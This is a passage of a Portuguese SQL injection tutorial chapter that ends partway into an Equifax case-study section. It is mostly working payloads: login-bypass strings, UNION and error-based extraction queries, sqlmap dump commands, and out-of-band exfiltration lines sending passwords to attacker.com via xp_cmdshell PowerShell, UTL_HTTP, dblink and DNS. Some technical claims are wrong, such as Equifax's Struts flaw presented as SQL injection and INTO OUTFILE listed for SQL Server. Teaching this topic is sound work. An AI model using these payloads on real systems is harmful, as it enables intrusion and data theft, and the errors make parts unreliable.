---
layout: default
title: "04-sqli-fundamentos"
---

# Capitulo 4: SQL Injection - Fundamentos

## Sumario

- [4.1 O Que e SQL Injection](#41-o-que-e-sql-injection)
- [4.2 Como Funciona: O Fluxo do Ataque](#42-como-funciona-o-fluxo-do-ataque)
- [4.3 Union-Based Injection](#43-union-based-injection)
- [4.4 Error-Based Injection](#44-error-based-injection)
- [4.5 In-Band vs Out-of-Band](#45-in-band-vs-out-of-band)
- [4.6 Payloads Por Contexto](#46-payloads-por-contexto)
- [4.7 Case Study: CVE-2017-5638 — Equifax e Apache Struts](#47-case-study-cve-2017-5638--equifax-e-apache-struts)
- [4.8 Prevencao: Parameterized Queries](#48-prevencao-parameterized-queries)
- [4.9 Prepared Statements](#49-prepared-statements)
- [4.10 ORM Security](#410-orm-security)
- [4.11 Input Validation](#411-input-validation)
- [4.12 WAF Rules](#412-waf-rules)
- [4.13 Exemplos em Python](#413-exemplos-em-python)
- [4.14 Exemplos em Node.js](#414-exemplos-em-nodejs)
- [4.15 Exemplos em Go](#415-exemplos-em-go)
- [4.16 Resumo e Checklist de Defesa](#416-resumo-e-checklist-de-defesa)

---

## 4.1 O Que e SQL Injection

### Definicao Formal

SQL injection (SQLi) e uma classe de vulnerabilidade de seguranca em que um atacante consegue injetar fragmentos de SQL maliciosos em consultas que uma aplicacao envia a um banco de dados relacional. O ataque explora a falta de sanitizacao adequada de entradas do usuario para alterar a semantica original da query, permitindo ao atacante executar operacoes nao autorizadas como leitura, alteracao ou exclusao de dados.

A OWASP (Open Web Application Security Project) classifica SQL injection como uma das dez vulnerabilidades mais criticas em aplicações web. Desde a primeira edicao do OWASP Top 10 em 2003, SQLi manteve-se consistentemente entre as ameacas mais relevantes, embora sua prevalencia absoluta tenha diminuido significativamente devido a maior conscientizacao sobre prevencao.

### Historia e Evolucao

O conceito de SQL injection surgiu naturalmente com o advento das aplicacoes web dinamicas no final da decada de 1990. O artigo original de Jeff Forristal, publicado em 1998 na revista Phrack, documentou tecnicas basicas de injecao em sistemas que processavam formularios HTML. Na epoca, poucos desenvolvedores tinham consciencia do risco, pois a maioria das aplicacoes web era estatica.

A evolucao do SQLi acompanhou a evolucao das aplicacoes web. Nos primeiros anos (1998-2005), os ataques eram simples e diretos. A descoberta de tecnicas avancadas como blind SQL injection, out-of-band injection, e second-order injection expandiu significativamente o superficie de ataque. O caso da Sony Pictures em 2011, onde 1 milhao de contas foram comprometidas via SQLi, demonstrou a escala potencial do problema.

Hoje, embora ferramentas modernas de desenvolvimento oferecam protecoes nativas, SQL injection continua relevante em sistemas legados, APIs mal projetadas, e ambientes onde boas praticas nao sao rigorosamente aplicadas. O Relatorio DBIR da Verizon de 2023 indicou que SQL injection responsabilizou por aproximadamente 8% dos incidentes de violacao de dados em aplicacoes web.

### Classificacao Taxonomica

SQL injection pode ser classificada segundo varios eixos:

**Por timing da exploracao:**
- **In-band SQLi**: O atacante observa os resultados da injecao diretamente na resposta HTTP. Subdivide-se em union-based e error-based.
- **Blind SQLi**: O atacante nao recebe os dados diretamente, mas infere informacoes por meio de comportamentos observaveis (respostas booleanas, temporizacao).
- **Out-of-band SQLi**: O atacante extrai dados por meio de um canal auxiliar, como DNS ou HTTP requests externos.

**Por mecanismo de injecao:**
- **Classic SQLi**: Injecao direta em parametros de formulario, URL, ou headers.
- **Second-order SQLi**: A injecao e armazenada e executada posteriormente em uma segunda query.
- **Stored procedure SQLi**: Exploracao de procedimentos armazenados que constroem queries dinamicas.

**Por impacto:**
- **Union-based**: Combina resultados da query original com resultados de queries injetadas.
- **Error-based**: Utiliza mensagens de erro do banco de dados para extrair informacoes.
- **Inference-based**: Infere dados a partir de comportamento observavel da aplicacao.

### Por Que SQLi Ainda Importa

Apesar de ferramentas como ORMs e parameterized queries existirem ha mais de uma decada, SQL injection persiste por varias razoes:

**Legado tecnologico**: Milhoes de linhas de codigo foram escritas antes da disponibilizacao de ferramentas modernas de prevencao. Migrar sistemas legados e custoso e arriscado.

**Complexidade de ORMs**: Object-Relational Mappers nem sempre protegem contra todas as formas de injecao. Funcionalidades como raw queries, dynamic query building, e custom SQL functions podem introduzir vulnerabilidades mesmo quando o ORM e usado corretamente.

**Novos vetores de ataque**: APIs REST, GraphQL, e microserviços apresentam novas superficies de ataque. Parametros em JSON bodies, GraphQL queries, e headers HTTP podem conter vetores de SQLi que nao eram considerados em aplicacoes web tradicionais.

**Falta de teste automatizado**: Muitas equipes nao incluem testes de seguranca especificos para SQLi em seus pipelines de CI/CD, permitindo que vulnerabilidades persistam em producao.

### Impacto de um Ataque SQLi Bem-Sucedido

As consequencias de uma violacao SQLi podem ser devastadoras:

**Extracao de dados**: Um atacante pode acessar informacoes sensiveis como credenciais, dados pessoais, informacoes financeiras, e propriedade intelectual. O caso do Equifax (2017) resultou na exposicao de 147 milhoes de registros pessoais.

**Manipulacao de dados**: Injecoes de tipo INSERT, UPDATE, ou DELETE podem alterar ou destruir dados, comprometendo a integridade do sistema.

**Escalacao de privilegios**: Em sistemas onde o banco de dados compartilha credenciais com o sistema operacional, um atacante pode obter acesso ao servidor.

**Execucao remota de codigo**: Em alguns casos, funcoes do banco de dados permitem a execucao de comandos do sistema operacional, como xp_cmdshell no SQL Server.

**Comprometimento da cadeia de suprimentos**: Se o sistema afetado for parte de uma cadeia de suprimentos, o impacto pode se propagar para parceiros e clientes.

---

## 4.2 Como Funciona: O Fluxo do Ataque

### Diagrama Conceitual

O mecanismo fundamental de SQL injection baseia-se na concatenacao nao segura de entradas do usuario com consultas SQL. Quando uma aplicacao monta uma query interpolando diretamente o valor fornecido pelo usuario, o atacante pode manipular essa interpolacao para alterar a estrutura da consulta.

```
+------------------+          +-------------------+          +------------------+
|                  |  HTTP    |                   |   SQL    |                  |
|  Atacante        | -------> |  Aplicacao Web    | -------> |  Banco de Dados  |
|  (Navegador)     |          |  (Backend)        |          |  (MySQL, etc.)   |
|                  | <------- |                   | <------- |                  |
+------------------+  Resposta+-------------------+  Resultado+------------------+
                                      |
                                      v
                              +-------------------+
                              | Montagem da Query |
                              | (vulneravel)      |
                              +-------------------+
                                      |
                                      v
                              "SELECT * FROM users
                               WHERE username = '" + input + "'
                               AND password = '" + input + "'"
```

### Fluxo Detalhado do Ataque

**Passo 1 — Entrada normal**: O usuario fornece credenciais legitimas em um formulario de login.

```
Entrada do usuario: admin / senha123

Query resultante:
SELECT * FROM users
WHERE username = 'admin' AND password = 'senha123'
```

**Passo 2 — Manipulacao da entrada**: O atacante insere um payload que fecha a string e adiciona uma condicao Always-True.

```
Entrada do atacante:
Username: admin' --
Password: qualquer

Query resultante:
SELECT * FROM users
WHERE username = 'admin' --' AND password = 'qualquer'
```

O `--` (comentario SQL) faz com que a segunda condicao (password) seja ignorada. A query retorna o usuario admin independentemente da senha.

**Passo 3 — Extracao de dados**: O atacante combina a injecao com UNION para extrair dados de outras tabelas.

```
Entrada do atacante:
Username: ' UNION SELECT username, password FROM admin_users --
Password: x

Query resultante:
SELECT username, password FROM users
WHERE username = ''
UNION
SELECT username, password FROM admin_users --' AND password = 'x'
```

### Mecanismos de Concatenacao Perigosa

Existem varios padroes de codigo que criam vulnerabilidades de SQL injection:

```python
# Padrao 1: Concatenacao direta (ALTAMENTE VULNERAVEL)
query = "SELECT * FROM users WHERE id = " + user_input

# Padrao 2: Formatacao de string (VULNERAVEL)
query = f"SELECT * FROM users WHERE id = '{user_input}'"
query = "SELECT * FROM users WHERE id = '%s'" % user_input
query = "SELECT * FROM users WHERE id = '{}'".format(user_input)

# Padrao 3: Concatenacao com ASP/VBS classicas (VULNERAVEL)
query = "SELECT * FROM users WHERE id = " & request("id")
```

Todos esses padroes sao vulneraveis porque tratam a entrada do usuario como parte da estrutura da query, e nao como dado. A diferencica critica e entre **estrutura** (comandos SQL) e **dados** (valores).

### Variaveis de Entrada Comuns

SQLi pode explorar qualquer ponto de entrada que seja incorporado a uma query:

- Parametros de URL (GET): `?id=1' OR '1'='1`
- Campos de formulario (POST): username, password, search, etc.
- Cookies: `session=abc' OR 1=1--`
- Headers HTTP: `User-Agent`, `Referer`, `X-Forwarded-For`
- JSON bodies em APIs REST: `{"search": "test' OR 1=1"}`
- GraphQL queries: `{ users(where: {name: "test' OR 1=1"}) { name } }`
- Upload de arquivos: Nomes de arquivo incorporados a queries
- Webhooks: Dados recebidos de servicos externos incorporados a queries

### Classificacao por Contexto de Execucao

**In-band (Direto)**: O atacante envia o payload e observa os resultados diretamente na resposta da aplicacao. E o tipo mais simples e comum.

**Blind (Cego)**: A aplicacao nao retorna dados ou erros significativos. O atacante precisa inferir informacoes por meio de observacao do comportamento (respostas booleanas, tempo de resposta).

**Out-of-band**: O atacante fuerca o banco de dados a enviar dados para um servidor externo sob seu controle, geralmente por meio de funcoes como LOAD_FILE (MySQL), UTL_HTTP.REQUEST (Oracle), ou xp_dirtree (SQL Server).

---

## 4.3 Union-Based Injection

### Principio Fundamental

A operacao UNION em SQL combina os resultados de duas ou mais SELECT statements em um unico conjunto de resultados. Para que um UNION funcione, todas as queries combinadas devem ter o mesmo numero de colunas e tipos de dados compativeis. O atacante explora essa operacao para anexar uma query fraudulenta a query original, forçando o banco de dados a retornar dados de tabelas diferentes.

### Determinando o Numero de Colunas

O primeiro passo em um ataque union-based e determinar o numero de colunas na query original. Existem duas abordagens principais:

**Metodo ORDER BY**: Incrementar o numero da coluna ate obter um erro.

```sql
-- Query original vulneravel (supondo 3 colunas)
-- SELECT id, name, email FROM products WHERE category = 'electronics'

-- Testando ORDER BY
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--    (funciona)
' ORDER BY 4--    (erro: unknown column '4')
```

Quando `ORDER BY 4` retorna erro, sabemos que a query original possui 3 colunas.

**Metodo UNION SELECT**: Adicionar colunas ate a query funcionar.

```sql
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--    (funciona, se a query original tem 3 colunas)
' UNION SELECT 1,2,3,4--  (erro:different number of columns)
```

### Ajustando Tipos de Dados

As colunas injetadas devem ser compativeis com os tipos de dados das colunas originais. Usar NULL e geralmente seguro porque NULL e compativel com qualquer tipo.

```sql
-- Colunas string aceitam NULL ou string literal
' UNION SELECT NULL, NULL, NULL--

-- Colunas numericas aceitam NULL ou numero
' UNION SELECT 1, NULL, NULL--

-- Para testar compatibilidade de tipo
' UNION SELECT 'a', 'b', 'c'--   (funciona se todas sao strings)
' UNION SELECT 1, 2, 3--         (funciona se todas sao numericas)
```

### Extraindo Dados Especificos

Uma vez determinado o numero de colunas e a compatibilidade de tipos, o atacante pode extrair dados:

```sql
-- Listar tabelas do banco de dados
' UNION SELECT table_name, NULL, NULL
FROM information_schema.tables
WHERE table_schema = 'production_db'--

-- Listar colunas de uma tabela especifica
' UNION SELECT column_name, NULL, NULL
FROM information_schema.columns
WHERE table_name = 'users'--

-- Extrair dados de uma tabela
' UNION SELECT username, password, email
FROM users--
```

### UNION Injection em MySQL

MySQL apresenta caracteristicas especificas que afetam a execucao de UNION-based SQLi:

```sql
-- MySQL nao exige aliases em subqueries (diferente de PostgreSQL)
' UNION SELECT 1,2,3 FROM dual--

-- MySQL permite UNION sem FROM (alguns outros SGBDs nao)
' UNION SELECT 1,2,3--

-- Para extrair dados de tabelas em outros schemas
' UNION SELECT table_name, NULL, NULL
FROM information_schema.tables
WHERE table_schema != 'mysql'
AND table_schema != 'information_schema'--

-- Concatenacao para extrair multiplas linhas em uma so
' UNION SELECT GROUP_CONCAT(username, ':', password), NULL, NULL
FROM users--
```

### UNION Injection em PostgreSQL

PostgreSQL apresenta diferencas importantes em relacao ao MySQL:

```sql
-- PostgreSQL exige que subqueries tenham alias
' UNION SELECT (SELECT string_agg(tablename, ',')
FROM pg_tables WHERE schemaname = 'public'), NULL, NULL--

-- PostgreSQL usa information_schema igual ao MySQL
' UNION SELECT table_name, NULL, NULL
FROM information_schema.tables
WHERE table_schema = 'public'--

-- PostgreSQL permite cast direto
' UNION SELECT CAST(1 AS text), NULL, NULL--

-- Para extrair dados em PostgreSQL
' UNION SELECT string_agg(column_name, ','), NULL, NULL
FROM information_schema.columns
WHERE table_name = 'users'--
```

### UNION Injection em SQL Server

SQL Server (T-SQL) tem suas proprias particularidades:

```sql
-- SQL Server usa TOP 1 ao inves de LIMIT
' UNION SELECT TOP 1 username, password, NULL
FROM users--

-- SQL Server usa TOP com porcentagem
' UNION SELECT TOP 10 PERCENT username, password, NULL
FROM users--

-- SQL Server nao suporta information_schema.tables da mesma forma
-- Use sys.tables
' UNION SELECT name, NULL, NULL FROM sys.tables--

-- SQL Server usa FOR XML para extrair dados como XML
' UNION SELECT username, password, NULL
FROM users
FOR XML PATH('user')--

-- SQL Server permite xp_cmdshell para execucao de comandos OS
' EXEC xp_cmdshell 'whoami'--
```

### Erros Comuns em UNION Injection

**Coluna incompativel de tipo**: Se a primeira coluna original e INTEGER e o atacante injeta uma string, pode ocorrer erro de conversao.

```sql
-- Se coluna 1 e INTEGER:
' UNION SELECT 'text', 2, 3--      (pode causar erro)
' UNION SELECT 1, 2, 3--           (correto)
' UNION SELECT NULL, 2, 3--        (sempre funciona)
```

**Numero incorreto de colunas**: Injetar mais ou menos colunas que a query original causa erro de UNION.

```sql
-- Se a query original tem 3 colunas:
' UNION SELECT 1, 2--              (erro: different number of columns)
' UNION SELECT 1, 2, 3--           (funciona)
' UNION SELECT 1, 2, 3, 4--        (erro: different number of columns)
```

**Funcoes de agregacao incompativeis**: Se a query original usa GROUP BY ou funcoes de agregacao, UNION pode falhar.

```sql
-- Query original: SELECT category, COUNT(*) FROM products GROUP BY category
-- UNION precisa de 2 colunas e compatibilidade com GROUP BY
' UNION SELECT 'hack', 1--
```

### Automatizacao de UNION Injection

Em ambientes de teste autorizados, ferramentas automatizam a exploracao:

```bash
# SQLMap - determina automaticamente colunas e extrai dados
sqlmap -u "http://target.com/products?id=1" --dbs --batch

# Extrair tabelas de um banco especifico
sqlmap -u "http://target.com/products?id=1" -D production_db --tables

# Extrair dados de uma tabela
sqlmap -u "http://target.com/products?id=1" -D production_db -T users --dump

# Extrair dados usando UNION
sqlmap -u "http://target.com/products?id=1" --technique=U --dbs
```

---

## 4.4 Error-Based Injection

### Principio

Error-based SQL injection explora as mensagens de erro retornadas pelo banco de dados para extrair informacoes. Quando uma query malformada e executada, o SGBD geralmente retorna uma mensagem de erro que pode conter dados da query original, estrutura de tabelas, ou outros dados sensiveis.

### Tipos de Erros Utilizaveis

**Erros de sintaxe**: Mensagens que revelam parte da query original.

```sql
-- Se a aplicacao retorna erros do banco de dados
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables))--
-- Erro retornado: "Conversion failed when converting 'users' from varchar to int"
-- O atacante obtém o nome da primeira tabela: 'users'
```

**Erros de conversao**: Funcoes como CONVERT, CAST, e TRY_CAST geram erros que podem conter dados.

```sql
-- MySQL: extrair dados via erro de conversao
' AND 1=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
-- Erro retornado: "Duplicate entry '5.7.34:1' for key 'group_key'"
-- O atacante obtém a versao do MySQL: 5.7.34

-- SQL Server: extrair dados via CONVERT
' AND 1=CONVERT(int, @@version)--
-- Erro retornado: "Conversion failed when converting 'Microsoft SQL Server 2019...' to int"

-- PostgreSQL: extrair dados via CAST
' AND 1=CAST(version() AS int)--
-- Erro: "invalid input syntax for integer: 'PostgreSQL 14.0...'"
```

### Extracao via ExtractValue (MySQL)

MySQL 5.1+ suporta a funcao ExtractValue que gera erros XML:

```sql
-- Extrair versao do MySQL
' AND ExtractValue(1, CONCAT(0x7e, (SELECT version()), 0x7e))--
-- Erro: "XPATH syntax error: '~5.7.34~'"

-- Extrair database atual
' AND ExtractValue(1, CONCAT(0x7e, (SELECT database()), 0x7e))--
-- Erro: "XPATH syntax error: '~production_db~'"

-- Extrair usuario atual
' AND ExtractValue(1, CONCAT(0x7e, (SELECT user()), 0x7e))--
-- Erro: "XPATH syntax error: '~root@localhost~'"

-- Extrair nomes de tabelas
' AND ExtractValue(1, CONCAT(0x7e, (
  SELECT table_name FROM information_schema.tables
  WHERE table_schema=database() LIMIT 0,1
), 0x7e))--
```

### Extracao via UpdateXML (MySQL)

A funcao UpdateXML gera erros similarmente a ExtractValue:

```sql
-- Extrair dados usando UpdateXML
' AND UpdateXML(1, CONCAT(0x7e, (SELECT password FROM users LIMIT 0,1), 0x7e), 1)--
-- Erro: "XPATH syntax error: '~$2y$10$hash~'"

-- Concatenar multiplas informacoes
' AND UpdateXML(1, CONCAT(0x7e,
  (SELECT CONCAT(username, ':', password) FROM users LIMIT 0,1),
  0x7e), 1)--
```

### Extracao via EXP (MySQL)

A funcao EXP pode causar overflow numerico que revela dados:

```sql
-- MySQL 5.x: overflow via EXP
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(
  (SELECT database()),
  0x3a,
  FLOOR(RAND(0)*2)
)x FROM information_schema.tables GROUP BY x)a)--
-- Erro: "Duplicate entry 'production_db:1' for key 'group_key'"
```

### Extracao via DOUBLE e FLOAT (PostgreSQL)

PostgreSQL pode vazar informacoes via erros de precisao numerica:

```sql
-- PostgreSQL: extrair dados via erro numerico
' AND 1=(SELECT 1 FROM generate_series(1,1000000))--
-- Se a funcao retorna muitos dados, pode causar timeout ou erro de memória

-- PostgreSQL: extrair versao via erro de cast
' AND 1=CAST((SELECT version()) AS int)--
```

### Extracao em SQL Server

SQL Server fornece multiplos mecanismos para error-based injection:

```sql
-- Extrair versao via erro de conversao
' AND 1=CONVERT(int, @@version)--

-- Extrair dados via erro de subquery
' AND 1=(SELECT TOP 1 name FROM sys.databases)--
-- Se a query retorna string, o erro revela o nome

-- Extrair dados de tabelas usando FOR XML
' AND 1=CONVERT(int, (SELECT TOP 1 table_name FROM information_schema.tables FOR XML PATH('')))--

-- Extrair dados usando RAISERROR (SQL Server 2012+)
' AND 1=1; RAISERROR((SELECT TOP 1 password FROM users), 16, 1)--
```

### Limitacoes de Error-Based Injection

**Tamanho da mensagem**: Algumas versoes do SGBD truncam mensagens de erro, limitando a quantidade de dados que podem ser extraidos em uma unica requisicao.

**Desabilitacao de erros**: Muitas aplicacoes de producao desabilitam a exibicao de erros detalhados ao usuario. Isso impede error-based injection direto, mas o atacante pode tentar forcar erros especificos.

**Caracteres especiais**: Algumas versoes do SGBD filtram ou escapam caracteres especiais em mensagens de erro, dificultando a extracao de dados complexos.

**Lentidao**: Cada extracao requer uma nova requisicao HTTP, tornando o processo lento para grandes quantidades de dados.

---

## 4.5 In-Band vs Out-of-Band

### In-Band SQL Injection

In-band SQL injection ocorre quando o atacante envia o payload e observa os resultados diretamente na resposta da aplicacao. E o tipo mais comum e mais facil de explorar.

**Caracteristicas:**
- Resultados visiveis diretamente na pagina da web
- Facil de automatizar
- Rapido para extracao de dados
- Depende da aplicacao retornar dados ou erros

**Variantes:**

**Union-based**: Usa UNION para combinar resultados.

```sql
-- Aplicacao que exibe resultados de busca
-- URL: http://target.com/products?search=laptop
-- Query original: SELECT id, name, price FROM products WHERE name LIKE '%laptop%'

-- Payload:
' UNION SELECT 1, password, 3 FROM users WHERE username='admin'--
-- Resultado: A pagina exibe "password_hash_aqui" na coluna name
```

**Error-based**: Usa erros do banco de dados.

```sql
-- Aplicacao que exibe erros em modo debug
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(database(),0x3a,FLOOR(RAND(0)*2))x
FROM information_schema.tables GROUP BY x)a)--
-- Resultado: Mensagem de erro contendo "production_db:1"
```

### Out-of-Band SQL Injection

Out-of-band SQL injection ocorre quando o atacante nao consegue observar os resultados diretamente na resposta da aplicacao, mas força o banco de dados a enviar dados para um servidor externo sob seu controle.

**Quando usar out-of-band:**
- A aplicacao nao retorna dados ou erros significativos
- A conexao e baseada em estado (stateful) e UNION nao funciona
- O atacante nao tem acesso direto a resposta HTTP
- A aplicacao usa HTTPS e o atacante nao consegue interceptar

**Mecanismos de exfiltracao:**

**MySQL via LOAD_FILE / INTO OUTFILE:**

```sql
-- Forcar o MySQL a acessar um servidor externo
' UNION SELECT LOAD_FILE(CONCAT('\\\\', (SELECT password FROM users WHERE username='admin'), '.attacker.com\\share\\file.txt'))--

-- Usando DNS exfiltration
' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share\\output.txt'--
```

**SQL Server via xp_cmdshell:**

```sql
-- SQL Server: executar comandos OS para exfiltrar dados
' ; EXEC xp_cmdshell 'powershell -Command "Invoke-WebRequest -Uri http://attacker.com/data?password=(SELECT TOP 1 password FROM users)"'--

-- SQL Server: usar UNC path
' UNION SELECT 1 INTO OUTFILE '\\\\attacker.com\\share\\output.txt'--
```

**Oracle via UTL_HTTP:**

```sql
-- Oracle: fazer requisicao HTTP a partir do banco de dados
' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/data?pwd=' || (SELECT password FROM users WHERE rownum=1)) FROM dual--
```

**PostgreSQL via dblink:**

```sql
-- PostgreSQL: usar dblink para conectar a servidor externo
' UNION SELECT dblink_connect('host=attacker.com dbname=exfil user=postgres password=pwd')--
' UNION SELECT dblink_exec('INSERT INTO remote_log SELECT password FROM users')--
```

### Comparacao Detalhada

| Aspecto | In-Band | Out-of-Band |
|---------|---------|-------------|
| Visibilidade | Resultados na resposta HTTP | Resultados em servidor externo |
| Velocidade | Rapida (dados por requisicao) | Lenta (requisicoes externas) |
| Complexidade | Baixa | Media a alta |
| Deteccao | Mais facil de detectar | Mais dificil de detectar |
| Requisitos | Aplicacao retorna dados/erros | Funcoes de rede disponiveis |
| Firewalls | Pode ser bloqueado por WAF | Pode escapar de WAF basico |

### SQL Injection via DNS (Out-of-Band)

A tecnica de DNS exfiltration utiliza resolucao de DNS para enviar dados do banco de dados para o atacante:

```sql
-- MySQL: DNS exfiltration
' UNION SELECT LOAD_FILE(CONCAT('\\\\',
  (SELECT password FROM users WHERE username='admin'),
  '.attacker.com\\noname'))--

-- O MySQL tenta resolver o hostname:
-- admin_password_hash.attacker.com
-- O atacante monitora os logs DNS para capturar o hostname
```

**Configuracao no lado do atacante:**

```bash
# Configurar um servidor DNS simples
# Usar dnschef ou servidor DNS customizado
python3 -c "
from dnslib.server import DNSServer, BaseResolver
import sys

class LogResolver(BaseResolver):
    def resolve(self, req, handler):
        qname = str(req.q.qname)
        print(f'[DNS] Query: {qname}')
        # Retorna IP falso para satisfazer a requisicao
        reply = req.reply()
        reply.add_answer(rr.RR(req.q.qname, qtdata=1, rdata=a.A('127.0.0.1')))
        return reply

server = DNSServer(LogResolver(), port=53)
server.start()
"
```

### SQL Injection via HTTP (Out-of-Band)

Alguns SGBDs podem fazer requisicoes HTTP diretamente, permitindo exfiltracao via HTTP:

```sql
-- PostgreSQL: HTTP request via pg_net (extensao)
SELECT net.http_get('http://attacker.com/data?pwd=' || password FROM users WHERE username='admin');

-- SQL Server: CLR para HTTP
-- Requer configuracao CLR habilitada no SQL Server
```

---

## 4.6 Payloads Por Contexto

### Contexto: Formulario de Login

O formulario de login e o vetor de SQL injection mais classico. A query tipica e:

```sql
SELECT * FROM users WHERE username = '[INPUT]' AND password = '[INPUT]'
```

**Payloads de bypass de autenticacao:**

```sql
-- Bypass simples
admin'--
admin' #
admin'/*
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin' OR '1'='1
admin' OR '1'='1'--
' OR 1=1--
" OR 1=1--
' OR ''='

-- Payloads mais sophisticated
admin'/*
'/*
' OR 1=1 LIMIT 1--
' OR 'a'='a
' OR 'a'='a'--
' OR 'a'='a'/*
' UNION SELECT 1, 'admin', 'password'--
```

**Payloads para extracao de dados no contexto de login:**

```sql
-- Extrair versao do banco de dados
' UNION SELECT 1, version(), 3--
' UNION SELECT 1, @@version, 3--
' UNION SELECT 1, banner, 3 FROM v$version--

-- Extrair usuario atual
' UNION SELECT 1, user(), 3--
' UNION SELECT 1, current_user, 3--
' UNION SELECT 1, session_user, 3--

-- Extrair databases disponiveis
' UNION SELECT 1, group_concat(schema_name), 3
FROM information_schema.schemata--

-- Extrair tabelas
' UNION SELECT 1, group_concat(table_name), 3
FROM information_schema.tables
WHERE table_schema='production'--
```

### Contexto: Campo de Pesquisa (Search)

Campos de pesquisam geralmente usam LIKE para buscar registros:

```sql
-- Query tipica
SELECT id, title, description FROM articles
WHERE title LIKE '%[INPUT]%' OR description LIKE '%[INPUT]%'
```

**Payloads de busca:**

```sql
-- UNION injection em campo de busca
test' UNION SELECT 1, 2, 3--
test' UNION SELECT username, password, 3 FROM users--

-- Retornar todos os registros
%' OR '1'='1
%' OR 1=1--

-- Com LIKE
%' UNION SELECT 1,2,3--
%' UNION SELECT null,null,null--

-- Com ORDER BY
test' ORDER BY 1--
test' ORDER BY 2--
test' ORDER BY 3--
```

**Payloads para extracao de estrutura:**

```sql
-- Descobrir tabelas
%' UNION SELECT table_name, NULL, NULL
FROM information_schema.tables
WHERE table_schema=database()--

-- Descobrir colunas
%' UNION SELECT column_name, NULL, NULL
FROM information_schema.columns
WHERE table_name='users'--

-- Extrair dados
%' UNION SELECT username, password, NULL FROM users--
```

### Contexto: Parametros de URL (GET)

Parametros de URL sao frequentemente vulneraveis a SQLi:

```
http://target.com/products?id=1
http://target.com/user?name=admin
http://target.com/search?q=test
http://target.com/page?id=10&category=electronics
```

**Payloads para parametros numericos:**

```sql
-- ID numerico
?id=1 OR 1=1
?id=1 OR 1=1--
?id=1' OR 1=1--
?id=1' OR '1'='1

-- UNION em ID numerico
?id=-1 UNION SELECT 1,2,3--
?id=0 UNION SELECT username,password,3 FROM users--

-- Subquery em param numerico
?id=1 AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),0x3a,FLOOR(RAND(0)*2))x
FROM information_schema.tables GROUP BY x)a)--
```

**Payloads para parametros de texto:**

```sql
-- Search parameter
?q=test' OR '1'='1
?q=test' OR 1=1--
?q=test' UNION SELECT 1,2,3--

-- Name parameter
?name=admin'--
?name=admin' OR '1'='1
?name=admin' UNION SELECT 1,2,3 FROM dual--
```

### Contexto: Cookies

Cookies frequentemente sao incorporados a queries sem sanitizacao adequada:

```http
Cookie: session=abc123; user_id=42; theme=dark
```

**Payloads em cookies:**

```sql
-- SQLi em cookie de sessao
Cookie: session=abc123' OR 1=1--

-- SQLi em cookie de usuario
Cookie: user_id=42' OR 1=1--
Cookie: user_id=42' UNION SELECT 1,2,3--

-- SQLi em cookie customizado
Cookie: preferences=dark' OR 1=1--
```

### Contexto: Headers HTTP

Varios headers HTTP podem ser vetores de SQLi:

```http
User-Agent: Mozilla/5.0' OR 1=1--
Referer: http://target.com/page?id=1' OR 1=1--
X-Forwarded-For: 127.0.0.1' OR 1=1--
X-Custom-Header: test' OR 1=1--
Accept-Language: pt-BR' OR 1=1--
```

**Payloads especificos por header:**

```sql
-- User-Agent injection (comum em logs)
User-Agent: ' UNION SELECT 1,2,3--

-- X-Forwarded-For injection (comum em IP logging)
X-Forwarded-For: 1' UNION SELECT 1,2,3--

-- Referer injection
Referer: http://example.com' UNION SELECT 1,2,3--
```

### Contexto: Upload de Arquivo

Nomes de arquivo podem ser incorporados a queries:

```
Content-Disposition: form-data; name="file"; filename="test.jpg"
```

**Payloads em nomes de arquivo:**

```sql
-- Se o nome do arquivo e inserido no banco
filename="test' OR 1=1--.jpg"
filename="' UNION SELECT 1,2,3--.jpg"
filename="' UNION SELECT 1,password,3 FROM users WHERE username='admin'--.jpg"
```

### Contexto: API REST (JSON Bodies)

APIs REST que recebem JSON podem ser vulneraveis:

```json
{
  "username": "admin' OR 1=1--",
  "password": "test"
}
```

**Payloads em JSON:**

```sql
-- SQLi em campo de busca JSON
{
  "search": "test' OR 1=1--",
  "filter": "category' OR 1=1--"
}

-- UNION injection em JSON
{
  "query": "' UNION SELECT 1,2,3--",
  "id": "1' UNION SELECT username,password,3 FROM users--"
}

-- SQLi em array de JSON
{
  "ids": ["1' OR 1=1--", "2' OR 1=1--"]
}
```

### Contexto: GraphQL

GraphQL apresenta vetores de SQLi unicos:

```graphql
# SQLi em argumento de GraphQL
query {
  users(name: "admin' OR 1=1--") {
    name
    email
  }
}

# SQLi em filtro GraphQL
query {
  products(filter: {name: "test' UNION SELECT 1,2,3--"}) {
    id
    name
  }
}
```

### Contexto: Stored Procedures

Stored procedures que constroem queries dinamicas podem ser vulneraveis:

```sql
-- Stored procedure vulneravel (SQL Server)
CREATE PROCEDURE SearchUsers
    @search NVARCHAR(100)
AS
BEGIN
    DECLARE @sql NVARCHAR(500)
    SET @sql = 'SELECT * FROM users WHERE name LIKE ''%' + @search + '%'''
    EXEC(@sql)
END

-- Payload para explorar
EXEC SearchUsers @search = "test' OR 1=1--"
```

### Metodologia de Fuzzing de Payloads

Um approach sistematico para testar SQLi em diferentes contextos:

```bash
# 1. Determinar se a injecao causa erro
' 
"
1' 
1"
'

# 2. Determinar se a injecao afeta o resultado
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
1 OR 1=1
1' OR '1'='1

# 3. Determinar o numero de colunas
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY N--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--

# 4. Determinar tipos de colunas
' UNION SELECT 1,NULL,NULL--   (primeira coluna e numerica)
' UNION SELECT 'a',NULL,NULL-- (primeira coluna e string)
```

---

## 4.7 Case Study: CVE-2017-5638 — Equifax e Apache Struts

### Contexto do Vulnerabilidade

